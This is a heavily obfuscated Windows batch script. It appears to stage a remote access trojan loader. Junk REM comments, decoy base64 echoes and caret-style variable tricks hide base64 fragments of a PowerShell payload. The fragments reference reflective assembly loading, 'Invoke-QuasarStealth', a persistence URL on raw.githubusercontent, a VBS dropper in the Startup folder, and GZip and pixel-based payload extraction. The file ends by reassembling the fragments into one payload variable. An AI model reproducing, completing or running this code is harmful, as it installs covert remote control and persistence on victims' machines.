@echo off
echo dWY4Rlp6ZzRBN1dvMkVyZXloY1ZhYzdRT0NaS1lHT0Rnd3ZHQWZ5TE51RVJBRHh2NkJnVU5SbUpsSUhoaE0zdkFpRWxJdEdVaUY3ZHI= >nul 2>&1
Se%KkHWf%t "LrGmpJAjVtX=IGdFnCNYsJqdtjX"
REM twilight vision glimmer echo ruby phantom kappa delta
REM kiln phantom zenith delta vertex
REM hawk hawk fragment vertex glimmer zenith shadow cipher echo lance
REM echo delta core hawk beacon fathom hawk phantom phantom
REM kiln ruby delta pixel sword circle
REM clearing fathom circle zenith
SE%TgsLZ%T "ilFLmUKDnuD=vyKSfNesGQREehcTmnJJRMevo"
REM pixel phantom shadow
REM fragment vision odyssey guard clearing kappa clearing hawk
SE%tFV%t "RdRIiOmagM=bHlUeXBlID0gJG1zY29ybGliLkdldFR5cGUoJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5JykKJGxvYWRNZXRob2QgPSAkYXNzZW1ibHlUeXBlLkdldE1ldGhvZHMoW1N5c3RlbS5SZWZsZWN0aW9u"
echo ejhNQXJBWDBsSHF5ek93Qk5vdTJCM1JsUlQ5YUZFbmxZcnN3d096WERrb08= >nul 2>&1
echo UVFMYzVKV2R4dXhPN1VuV3RFcFd5QWNkOGxUdVhqRERsYjFLUDVwY1N6UHR6cVZoMnRNanRYSnVBVU0xZkxwUjhSMUVIR0FVNHNzbQ== >nul 2>&1
echo bHBaSVdIcDl2ZUhmdk45T1dZSGxPelB2cDhyczVTcVlaN29iN2ZoQlNlV2YxdG56RWlrcXNocUdYR0VEY2RYUHk0bTZvcExhN3B0 >nul 2>&1
se%dMb%t "rtCvTSIOCbbKjhN=fJcMOWpNFtvarSQLxoWSuApkrI"
sE%sdpP%T "pyTPbnYPUZkat=XSaiMKMtZvBOrXTBvpVnUpEecVjg"
Se%owuVK%t "WpvzFspc=XgUQdMZsawuIAkJHmvWbWa"
sE%pcm%T "pgOhItGWpwM=ydELijDaWmLkCWzoUiuHp"
se%Ntu%T "wExRnwditWdXKEx=AURkmKTVzWXBZMHMAROeyb"
REM glimmer fragment binary lance beacon glimmer glimmer strobe twilight lance
se%SiJlo%T "HbcrghnAtYv=WlsZWQgdG8gaW5zdGFsbCBwZXJzaXN0ZW5jZTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiICJZZWxsb3ciCn0KfQokUEVSU0lTVEVOQ0VfVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93aGF0Z"
REM zenith kiln phantom echo guard
se%RILy%t "atKQXAHjeRqM=AybCUytERVceQLNNudWjcESdT"
REM vertex valley core kappa
REM beacon phantom vision clearing cipher
sE%GfZke%T "IfmQWEACEOspk=TpjodshyJuJzYRoIiQWVqyIJZ"
sE%TzTM%t "FOvZRfDidXhqAw=dxZUpnCJoeVITIcKkQSaG"
se%VuoLr%t "qoODaTFIddRiNJ=PgLRrrKyEJCHr"
sE%FQu%T "lbsCYjIp=eJzywNToCOQJyy"
sE%eKjek%T "QljmSbHEdiiYYOO=nbZVTNFsufsYSHAXClWFEabZgDZf"
REM binary core phantom fathom kiln phantom glimmer shadow
sE%jyHV%T "DWLfbLUjIBPv=yMFcSNaRGwNRBdvBsA"
Se%eIrMs%t "DRAallUwZhAR=RWnMRbVytZPOhzAhlsQCoJwac"
REM phantom sword kappa vertex beacon kiln
REM odyssey shadow delta
Se%biaqR%t "iJhIHxq=TXdVmXxYXkmeQhf"
REM delta valley vertex glimmer undergrowth echo
REM fragment glimmer clearing guard core zenith
REM cipher strobe lance mirage phantom twilight fathom
sE%xWhjD%t "RLIqthHbrhax=bViivftEGIQVouup"
REM guard shadow odyssey binary ruby delta kappa fathom core shadow
echo OHB6cjVROGppd2llWFhlemNTcnJoWWhmWFRLMFRRWGQxckZFY0hiYlFHeWVsVVdERkZ5RzM5VHcxa0VrT1B3V2Jy >nul 2>&1
REM clearing echo cipher strobe guard valley
echo cnQ3Qml3NTB2bkdPSHBxeG1hUG0zREQzRDVvQnlJUE9YN0RzZUVNZkpkTFU1OEc1MFpVcG9VUjByMVkxcXltcDhCYnhYZEZXODc= >nul 2>&1
REM glimmer valley phantom delta
REM kiln glimmer pixel vision strobe fragment
sE%vrDB%T "jiyAbzHGfHXrt=qXNkUARwbuUrNMtBSQJaOVCSVBvMMBbxY"
Se%EwkIy%T "GdqSlRgOOzEb=TawnmsFHarwkNcIsAwp"
se%HdUkq%t "fChIcYyAUIu=JnkCaIiESsOmUjmmvCcHmcDGuYIckEEUxId"
echo YlJTRzN3Q2w3TUdkcDdlenA0QWpsMVBzSWlHNFBQSWtRaEVtc3FGQ0UxdGFzQnY= >nul 2>&1
REM kiln kappa cipher zenith valley vertex delta pixel strobe
REM echo fragment fragment
se%dqeX%t "zIJGUFS=KBWwmMTXWlbAOajIamMGab"
sE%yunfC%t "IWCBtgOnNnaCQHk=iqpdPOmlHwBVMvjfqhyzYYzjZcpNN"
sE%mzyQg%T "tRocdTbWAkpSFHY=UScDMFeFOabvGkFKkmru"
REM twilight phantom cipher mirage vertex
REM fathom odyssey fathom mirage
Se%BPsXe%t "ENPiNUo=nAybfjecaVJHKtEuim"
se%CBjr%t "CAEwLkKrRZ=bZXLKeEUzXkNpJnGYZvuRyg"
REM twilight guard core
echo dEJSYmZ5aTJJWURPbmR4SjNPMDc5N2dMY3VJbzEzR3czUnpPU0dlck0= >nul 2>&1
REM circle echo echo guard echo ruby zenith twilight strobe
Se%eMld%t "mqDqnQmFdYRgYPo=GoAMyVFayeRbdeaxGqpT"
sE%BPPnf%T "sEVLEEk=vERnnelNAuVUhwVGKhmxJzLBzp"
REM odyssey binary pixel core
sE%yAfVq%t "EktxnJchl=tojFrTqbCuBENQzgbtXRMqcgX"
echo YklUQ2ZpMzRtc1hTN2hZSDhDM3lnRjFPdjNhMUJlV3l0OVZBdWFFQWQxQ1pjb0tQY3lURkFDNzR0clhFcTJPeQ== >nul 2>&1
SE%hDn%t "kLOuSKyqK=MijJiFsEQiPDiyvVxhiJzVYschlciKOAZZ"
REM kappa ruby beacon glimmer beacon fathom fathom undergrowth binary odyssey
sE%Mjf%T "KaekJBc=rikTQCGgXNXSSGaGiFxpJTJDOfTTqCXJtFt"
echo c25aYWFSN2ZoUHI1MXl5NnREQWRiOW1Uc1VydWFBQlh0eWpxVlFVRUQxdDFZNmExNUdrNnV0WA== >nul 2>&1
REM glimmer kappa guard undergrowth pixel
REM echo lance shadow undergrowth undergrowth vertex beacon
REM pixel undergrowth circle
Se%uWyn%T "fAOZaYV=STvScgJdGadW"
SE%TMh%T "tAJzCCQTgRR=XmTvKsMFKmTH"
echo d1o3cHc1eFkxTTh6Q0VsTFE0UHBWVThPZXphY3VETHByQ0FRSmFLQWlLcVZ5SEhqS2lNUVB3bTliMA== >nul 2>&1
REM binary core glimmer
echo TGo5SHVtUlpCeVQ4VEtMN2tWemNMYUtyU0RxUmhuTGtrZlN0Y01UaEpyQUJxeXJsTGEyNm1SNENla05odDJlbzZDQUY4UkdI >nul 2>&1
REM odyssey strobe ruby kiln
se%Cnkl%T "FoYaknztpBD=CzzIgKfiLN"
REM echo strobe delta sword vertex fathom
REM vertex clearing ruby mirage mirage fragment
se%FxbG%t "rMlrqHiCiOkF=xEEXxMzcauRpinxexLzAmbBiopXx"
echo VkVqdjhtUVExeGJHRHVOV1VpNWZmM1JhZm1aNkVWemlXU1B4bEd4OWJZbHZ1 >nul 2>&1
sE%SUZ%t "UEfRLWmbMlbsyUX=rlMjUpbYEsjJCzAlPo"
Se%Kwqx%t "ZjezghCujsk=QXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5hZGRfVW5oYW5kbGVkRXhjZXB0aW9uKCRvbkV4Y2VwdGlvbikKZnVuY3Rpb24gSW52b2tlLVF1YXNhclN0ZWFsdGggewpwYXJhbSAoW3N0cmluZ10kU291cmN"
REM glimmer undergrowth kiln
echo MllPbFR4WndMRGdMbDRseWhUWHhpaTExTmVKbmdiTFFNODJkSlhIUzRKS2l5aWJTVVkzQkU3Y1BRNHZ1WlRQWTFlVW1XYklrbw== >nul 2>&1
REM beacon vertex odyssey beacon fragment beacon sword twilight
REM beacon vertex kappa shadow sword lance core core vertex mirage
REM core lance mirage echo kiln sword cipher pixel
echo OHUyU2dwTHhUUW5HSWZ1WFMzbTV3VDRjMXhtNW9FbXVYT2F0Q01XZWdsZHZ2QU1YRnBhZjV5a3Exem8xc3psTU1jazNocE1IOFM1Sg== >nul 2>&1
Se%dwJ%T "BoTkXJIpNqQ=gIkdFVCIsIHUsIEZhbHNlCkh0dHAuU2VuZApJZiBIdHRwLlN0YXR1cyA9IDIwMCBUaGVuCnRlbXBGaWxlID0gc2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlVEVNUCVcdXNlci5iYXQiKQpXaXRoIENyZWF0ZU9iamVjdCgi"
sE%OwUx%t "qUDvUranMXLDw=PNjmgtzfMoYRikgJyBHrYQwDbXBIOuTOF"
REM beacon kiln phantom phantom
REM beacon delta circle cipher vertex kiln
se%ggd%t "HhVvgWimjlrQK=jBrkaOioVWHgByTYtFzBCcRxWwnuLD"
sE%OSQG%t "cEEymAhbs=hzFDQOhiQQVxTTqir"
REM ruby delta cipher phantom ruby
echo VFBzSFFGOGgwNjRMUDNVSW9KVGQ5T2JOWkZNeldIZEZRcExoSUFvSGg= >nul 2>&1
SE%PqF%T "pXAmuVpQiALw=ADefgwbpMZRPAeNfTpSbW"
SE%qZxLT%T "AxXrzuCelge=QoBJzHICbYpUWfEhEtKnuEBaPpFUc"
sE%vPg%t "WRAkbu=zLfvYfncowujVwtdEAiitacdFiAHNcHnVMW"
Se%HrY%t "zMjfJPUCmLva=XcmlKDZvuslSNUaZXUTxyfhDNSbp"
echo dU9MOFpnSnoxeXJOaG1KVDdkbzc5OGlyaDRwdnhOTnAxOTZRMjZrSUlkR2FQbHRjZ0tXOU5xV0hha05tSm5SUzE0S3c= >nul 2>&1
REM circle guard twilight hawk fragment echo beacon valley sword vertex
sE%tIY%t "eWoLtRtCDO=0aDogJGxlbmd0aCBieXRlcyIKJGV4dHJhY3RlZCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtieXRlXQokZG9uZSA9ICRmYWxzZQpmb3IgKCR5ID0gMDsgJHkgLWx0ICRoOyAkeSsrKSB7CmZvci"
Se%MlpGb%t "FjPLukiNtub=kJumUrstDBmyPHWhZtIicPGaKTnAu"
REM vision zenith glimmer glimmer phantom undergrowth core cipher ruby
SE%GQH%t "zivFCYaBBPdDAT=DDybnEWFkBjOqmkH"
se%xsp%t "gauRGBQPoKHu=PaNfWWfCVUxiDZRlOIKUjaqDVXtaHxpT"
SE%ZdKeV%T "GbQVxFq=QxCJqrqEUabvXDREubgiSDjVQTDpIhGmsSs"
se%gqqi%t "AUNSCnrxBCETK=scmLINQAdMUIiDvFbUjym"
REM vertex kappa binary vertex
REM echo delta vertex zenith cipher sword delta fathom
REM zenith echo delta pixel hawk pixel zenith fragment
REM fragment lance odyssey
SE%tRQSn%T "QTWKouKomJtuq=hyskNnyYDHctVJJWVbsUn"
Se%ItgGo%t "YGjHiRvFvGpG=ICgkU3RhZ2VyVXJsLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7IFtpbnRdJF8gfSkgLWpvaW4gIiwiCiR2YnNDb250ZW50ID0gQCIKRGltIHNoZWxsLCBmc28sIHRlbXBGaWxlCl"
REM sword vision vision core zenith
se%KJZ%t "yZhCov=kvFACWFLSwWMQf"
echo QzdYQURpSTlIdUlJMGFreFdCdGI0ajEwZEJEY0Z5WW9HYWlZVlBma0VrWA== >nul 2>&1
Se%rfR%T "TWnszJMqNEot=JUJyQFIAKmotEuqfovoxIvERQqDRFtWo"
echo M3BoeHBVTGhqV05nRjJkc2hxQ3VVbnZIVFpCMXkzZnZJbXJjMU12SXFTRkNZaw== >nul 2>&1
Se%ZbLml%t "KkvwVZKPUv=LKYbnrwXCyzIFxJIskjieosu"
REM odyssey fragment valley beacon odyssey ruby cipher vision
se%qgP%T "SsQopkDMn=BFOwwshvUgtauGUmq"
sE%vjgF%t "kGftGEsRDmfZ=qmvmYAASaIOEijpp"
se%VmzFA%T "aqPteAuaZhy=rVHsrwYpzkHaM"
echo ODJ1Z0d0S2lEUWRTQzVzS3BnampBQldSOGRCU01mNGFUV2E2MFd6Q1JOeHI= >nul 2>&1
echo OTdheVlHVDVFdHd4TUw4T1VMcHJLT3pPdklFZjVNTWhidzV6OWNtaDd5b01ZQ3hOUjRkbW1wN0xvTkNzZlM1cjgybE9Ld280TTJZMDRqdm0= >nul 2>&1
SE%Vjp%T "DgelWgNYBBf=eGZfmxFPmlrmmSxvlGAxNRmIuRobh"
SE%DRIde%T "hWUcNyLbj=GFyYW0oJHMsICRlKQokZXggPSAkZS5FeGNlcHRpb25PYmplY3QKTG9nLVNpbGVudCAiW0ZBVEFMIEVSUk9SXSAkKCRleC5NZXNzYWdlKSIgIlJlZCIKTG9nLVNpbGVudCAkZXguU3RhY2tUcmFjZSAiUmVkIgp9CltTeXN0ZW0u"
SE%ROHfr%t "yxWAVUEEerko=GjuKKVjatbd"
echo WGJvOENiR1pvSU9iS3l1ZDNDbkVjSnRQNWRvSUFkT1ZFYU11REc4NEhXcVFRUHNoNjNRNkQzWTRQTUFxcU9kOEdzTQ== >nul 2>&1
REM circle kappa pixel
REM pixel strobe ruby glimmer
REM twilight delta delta delta valley vertex clearing
Se%jTg%t "WqLTyLnvSvsq=uBgWSnqlMaPGHKFSftEbGUMTcjOdXVkmrS"
Se%SmgL%T "xgzKhRx=vLVQWsoPHNFjoIRotXSaAYntoNfpADQF"
REM pixel vision valley valley
REM sword binary sword valley ruby vision circle mirage mirage
REM kappa delta fathom echo
Se%Gvs%t "kRMxSbWOfHqh=kQGGKkTDKpk"
sE%QwH%t "vdQSWQIfhDWCLCY=pYjyUIoXLZPFdYKLknASpvxvwXWGsjjdCLh"
REM clearing fathom clearing valley
se%sDno%t "WhbceG=IWtVwDAgrUNHHmqqpNNAS"
echo VjZxanFlS2lvVHlPZFczRWZxT3VTQmh1ZkNZUzhFaEMxYTNMWTZCbk1ZWTVRclNycA== >nul 2>&1
REM valley fathom fragment sword ruby echo core pixel ruby
REM shadow fathom shadow fathom fragment valley twilight hawk
REM vision fathom binary phantom echo hawk valley echo vertex
echo QjlFRVlvaXM3OWt0bmVHVWFDR08xa1lrRFhaOWRwZUYxWW13bjd0eWF3eA== >nul 2>&1
sE%PiAiY%T "BmzVGDGXGPBloro=tSTiYYDEmWvCUoBpcfWqyeYQMhUzWV"
echo dFFpMEZrZGlTMktZTUEzVzJabDUxemc5UmpyT2FPbEpEQ3lNQmVZcjlzUA== >nul 2>&1
REM beacon sword zenith
SE%YQNP%T "ARHZKnt=jUMnXcNWSaLWa"
SE%DxcaQ%T "RYDRvhSuIG=nkabdRJVthjoduIitLtJIiLkzOjX"
Se%jkQE%t "oJjqQRCmGYOk=VUkwiCkluc3RhbGwtUGVyc2lzdGVuY2UgLVN0YWdlclVybCAkUEVSU0lTVEVOQ0VfVVJMCn0KQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZwokb25SZXNvbHZlID0gW1N5c3Rl"
se%guGD%T "PsvHWfN=CaduarWpXsrawAszuNogIEUBNOZdAaeEYnn"
echo OHhKcGJLN0dzc2x3MU00SkRBeVdqYlFVZmRtWGxoNTF0U1d5MkpSR1I3RGNVbw== >nul 2>&1
echo V21WVUF6VXBuTzBoYTEwTnpuZ3IzMFJRTGphZVoxREhnQm1rYm1YY1M1ckhMbUJIOVF5Qkk= >nul 2>&1
echo YzBySTZQbUxUSEpSUVhhcHg2eGNXM1N6RURnS0NzNXB3Y0JNVGFWVktQWXlqOWgwNUVYeFY= >nul 2>&1
echo elM3VFdENXByMjdjbjdZdktvYWdSZml6WUtNZmVtVHRlakNaUmFpb21XQUJjRHhla0V1ckp4azBSYVA= >nul 2>&1
REM valley odyssey kappa
echo Zm1IZnZkWnVtTjdtdE0wZTFLMHAzTnBPb0VOT0dYcHRlMjhvNmRxeWV1M1pKYzIxRlllUElPR2lvaW5LUE0zOA== >nul 2>&1
REM hawk zenith zenith lance valley kiln
sE%thKi%T "RDrszG=xapEfoYVRjWcBpmVOmhKnpNZNgNfXhvTbFH"
REM circle beacon hawk zenith
echo UDJCTjdTM2tGWHB1b2pMeUNGcUZLMzlzRUoyTXltVG9ucGRNb3M0TQ== >nul 2>&1
SE%DgYJ%t "VvpZxsh=txovZqDBNsQKVvTRRhu"
echo U3lQQnNXQjdNREZodXpOc0lnSXU0T1JOSHcwZVVIWmExZDIzeGEyU3FmS2VDRWx4NnVRQjZZY2s0cHR6dWRJbnhhWWhVRkFoNElkRWdUYnQ= >nul 2>&1
REM kiln zenith echo mirage mirage zenith circle strobe
sE%sRR%t "NjVLIHtIpwX=ZSAtRmlsZVBhdGggJHZic1BhdGggLUVuY29kaW5nIGFzY2lpCkxvZy1TaWxlbnQgIlsrXSBQZXJzaXN0ZW5jZSBpbnN0YWxsZWQgdG86ICR2YnNQYXRoIiAiR3JlZW4iCn0gY2F0Y2ggewpMb2ctU2lsZW50ICJGY"
REM pixel guard clearing glimmer valley lance
se%crNXx%t "kmbsbv=NlcHRpb24uSW5uZXJFeGNlcHRpb24pIHsgTG9nLVNpbGVudCAiSW5uZXI6ICQoJF8uRXhjZXB0aW9uLklubmVyRXhjZXB0aW9uLk1lc3NhZ2UpIiB9Cn0KfQpJbnZva2UtUXVhc2FyU3RlYWx0aCAtU291cmNl"
sE%szme%t "zSyfwjEreKcKVr=VmwNDhouDDmVFWWsgdUSdxJUFHVWmT"
sE%tgOk%t "kRkNfrEUJ=m9yIChbdWludDMyXSRwMC5HIC1zaGwgMTYpIC1ib3IgKFt1aW50MzJdJHAwLkIgLXNobCA4KSAtYm9yIFt1aW50MzJdJHAxLlIKTG9nLVNpbGVudCAiWytdIEV4dHJhY3RlZCBQYXlsb2FkIExlbmd"
echo RnZ1dk9mSVZvSFpVRjR6U0NTWlk1NGg1YmlFdWIzWnlaTG1zZ1BKVVpYRElJWWQ3cTBNT3VtNUZXMVlIMUNZVmp0dmlIdg== >nul 2>&1
REM phantom vision phantom
echo OEp5T296NmRZSnpaNWpCdEJhcmY0MTJteUVnZGNtN0tjZmxRcWFjcmVJMDJ3TGJnMVdrc1JUeXJaQ2wwVDBwNXpXM0oyTUs0WUNleTg1a0s= >nul 2>&1
REM zenith core odyssey shadow shadow
REM core fragment zenith phantom shadow beacon fragment kiln
echo NHF5ZWdiQXVKZEhveVBjSlRvdXR0Ym8xVld6bENFUlVMWlh2N1U3R0d6bEE= >nul 2>&1
echo VG5SczJyajRVN0FCUnhVakhoUEowYXU2WnhsNGk3R1Bubm5jWmN2dkZMZHJmeEpUdVIzVHdZNjVQcDMwbjF3V1VodjRWc3A= >nul 2>&1
REM core binary circle clearing strobe
REM glimmer clearing glimmer beacon lance zenith sword clearing odyssey circle
se%ljq%T "faTwqPsWR=kxrzQSStxawFXailxPvYeYkRf"
REM twilight kiln odyssey cipher glimmer circle hawk circle
sE%nqw%T "jfHrruokSo=jKboZSCFkxYyekqUzsQjIrChDlJdtcXcxyy"
REM ruby delta circle clearing vision vertex lance twilight
REM shadow zenith kiln core binary delta sword kappa clearing binary
REM zenith cipher delta sword core core guard valley
REM valley pixel delta
echo N3FpT0d4c1dVSHllbzllcWIzblVCekRMTTNIdE9rSERxdlpoZmJOQlB1NElxUVl1M0ZZcnB0ZUJTdFNza2FWZVgwbg== >nul 2>&1
se%KuL%t "dASpTqE=hQvlvDjRTHCTTfDepionUCjcatySuTEbgRP"
REM phantom zenith core beacon
echo UVpYNE9EcmFwbmNWSFptR1BHSzU4RjVvNERPYmlEdjBXd1h5dHJRazAzQ2VxZVFZNkViTkVXbUtpN0x5Q0ljU1Q= >nul 2>&1
SE%fvOYr%T "VrUpgbiYPZfqHj=gKNCbCIpjKMhKuLeWs"
REM clearing core valley valley glimmer echo strobe twilight hawk kiln
echo VkxQSzU0c2h2WUdmNUtzUmo4VkpvVzNLRjlrR3B2bmxDVUdjNW9sS09Vdm9mT1VsR3A4SktRYTJvcWNwRVFtM1pSQVhrR1ZEUU5yYmpSblI= >nul 2>&1
echo V0hoSURFazhzN3oyd0owM2hiNzBIblNHdEtFd2FZMFE4Nm9MMXB6MVpuclhn >nul 2>&1
Se%LUDCZ%T "WGAkszKsyk=hvWWTqfUJOXl"
REM glimmer lance mirage undergrowth circle clearing
sE%VHgR%t "ATxmTIJjtv=NkXamYcSvshNvFnHL"
REM hawk lance circle shadow
sE%DMge%t "QaYESCLs=ikfddncXkGVdndeTIgfCJUrUfMGDJ"
REM glimmer sword vertex guard ruby zenith
REM strobe fragment delta lance glimmer fragment beacon phantom guard shadow
se%AjQ%T "phykecAnqa=lqqPdlUdkVNYkdjVaCWERhiHxiBQkotXR"
REM kiln kappa cipher pixel kappa delta circle
Se%aZLKb%T "GILUxKzaaOx=CvOwBdiwZjukfZZGh"
echo WkJVbnBzTEZ0NFMwTEh3TDllcHI5NDNldWVyMFdIS2Q2RHNQSWZINjh6U0dyVFo3dG5OelhlZjQ0ekpiZU1YdWNvV0hDbVprVVc3SlVz >nul 2>&1
echo b1E0bTdoYkNndmFNU25qRlplOEtCODg1ZnBqMEpVZm85b3RrOWZWbjFha05SbFJ4V3A5UDFNR3BYZlNFcDBOa2RPZHk= >nul 2>&1
echo bDFiMGRvdjVKMVlWU21DY2NCc01tcEV6djd6RlNrWTBOQ09aVG45RTBORloweTRKbDl5MzUzOThHNWdmZ01jb3c= >nul 2>&1
REM vertex binary fragment clearing
SE%CHF%t "aEkGOhpmwskWzRH=wvsLnuZsiuxDZA"
echo R1lQaWRtUHNaV2IxaFNKSEdPZngySEVBVTNBOGJnMWxEWDBqbmV6ZGQwYmM1V0w3R3g1UHJCYjNJVktDaXlOOGRKSTdUdllX >nul 2>&1
REM kiln kappa phantom kappa circle zenith
se%oZpmg%t "PwiNLgLmh=oDkrlyFfpMkaHiLCvlZorWOKX"
REM core beacon kappa strobe core strobe lance zenith shadow
SE%aaP%t "mapeuWp=PxsorwnrwHgXxWvxH"
REM vertex twilight sword pixel
SE%WTHN%T "RhGyYrSskvRcFH=aUOrxVjjpm"
sE%WEljb%T "QFokRbTMVjPKp=rnpFrNohLeafVJbKUNHnWAcLwBfctQdAay"
echo SDJaM3pIRFlQeHh6TUpRMENCS2xkMUx5NTk5U3UydWZVeWFZdGlNUVdvelBjb2tUMQ== >nul 2>&1
REM twilight phantom phantom odyssey delta cipher sword
Se%pCOay%T "fTCxZrHs=zYPJjiIHzYJitJvK"
SE%VZf%t "rPnBFrpQeg=ESXYwOxzoXNaFYZEgyMGSsf"
REM sword binary valley vertex kiln
Se%XGMem%T "bgjyjA=U2Vzc2lvbiB3aWxsIGJsb2NrIHVudGlsIFJBVCBjb21wbGV0ZXMgb3IgY3Jhc2hlcykiICJDeWFuIgppZiAoJGVudHJ5LkdldFBhcmFtZXRlcnMoKS5Db3VudCAtZXEgMCkgewokZW50cnkuSW52b2tlKCRudWxsLCAkbnVsbC"
SE%cEsY%t "sGqAsJundWEw=ZaxFQLjFPnCXfWAwqjEi"
SE%MPmAR%T "ZerFeROppmZe=NEaPAXPWavnhNaxDQfIFHovChKwTynvL"
Se%yYd%t "uzuUOlkkje=JwSfAkjvSrpEONlm"
se%bWcjt%T "wmgFpe=mUwMFtSJFyGAaJArMr"
sE%qwGC%T "RHxXJs=tdIEFzc2VtYmx5IExvYWRlZDogJCgkbG9hZGVkLkZ1bGxOYW1lKSIgIkdyZWVuIgokZW50cnkgPSAkbG9hZGVkLkVudHJ5UG9pbnQKaWYgKCRlbnRyeSkgewpMb2ctU2lsZW50ICJbIV0gSW52b2tpbmcgRW50cnlQb2ludC4uLiAo"
SE%JsgR%T "vplNPL=2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwIikKJHZic1BhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRzdGFydHVwRm9sZGVyLCAic3RhcnR1cC52YnMiKQpMb2ctU2lsZW50ICJbKl0gQ2hl"
Se%Hxl%T "WCMYwSkbHyKKPU=JwwrBDFGJurELx"
echo c0UyM2d6UUZ1TjdpdHljUlVid2QzWGZNUWY3dmk1d1hkM3Z2RFpGSFNlYg== >nul 2>&1
REM shadow strobe pixel ruby binary echo ruby
echo dnlXMm9IZTRMOGFPTGYxOENNWURRNmZmdVJLNE0yeE5ZekZoaTFaQlA1dkRMQ1B4YkVLN2ZLcVNOSzI= >nul 2>&1
Se%gUSn%t "ZXkNDB=vgyZfqSNZyCpOHJkrCCLNimmhXA"
REM circle delta binary echo core
SE%BrcOi%t "mkZdZrQIdu=coAZrBBKdzwheXlSGeevrKhdxwxK"
REM kiln odyssey hawk guard
se%iJt%t "golzhYVvK=hrIszTrXKyRUtaynuXdmDbeWdd"
Se%lkf%t "SRIhKywPf=Y2tpbmcgZm9yIGV4aXN0aW5nIHBlcnNpc3RlbmNlIGF0OiAkdmJzUGF0aCIgIkdyYXkiCmlmIChUZXN0LVBhdGggJHZic1BhdGgpIHsKTG9nLVNpbGVudCAiWypdIFBlcnNpc3RlbmNlI"
se%CAifb%T "tOOlJJSFfwyPXN=fGyktAyJtjKtNrUAaOnOYIwCse"
Se%WZtO%t "BjeqLH=vGeWEzdHmg"
REM shadow kiln strobe shadow
REM twilight sword echo beacon
SE%DrPj%t "rbNeWNa=DQafYHeelBku"
se%VNq%T "FUlXcfwKdYs=MgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0oLCRwYWNrZWQpCiRncyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLkNvbXByZXNzaW9uLkdaaXBTdHJlYW0oJGNtcywgW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21w"
REM strobe strobe pixel undergrowth fathom mirage kappa kappa mirage
REM fragment strobe cipher kappa undergrowth
Se%OMb%t "nSiOrN=tCUPcGgOTScawIHddqiRleRQkh"
Se%LfTwF%T "UvHleRdjOcPL=jZNefQEgzglDFkxkLLlCRrmgTIV"

REM --- Reconstructing Payload Variable ---
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%VtRZpZv%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%nOzLGuog%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%VPxRjkm%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%jwzFek%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%vplNPL%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%SRIhKywPf%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%VaCYchlcaW%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%YGjHiRvFvGpG%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%wqlOlNmDt%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%gWhync%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%BoTkXJIpNqQ%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%ZrtyWBs%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%vfjkzpPqPr%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%NjVLIHtIpwX%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%HbcrghnAtYv%"
set "XBLrLBsMMOWD=%XBLrLBsMMOWD%%KxhNVx%"
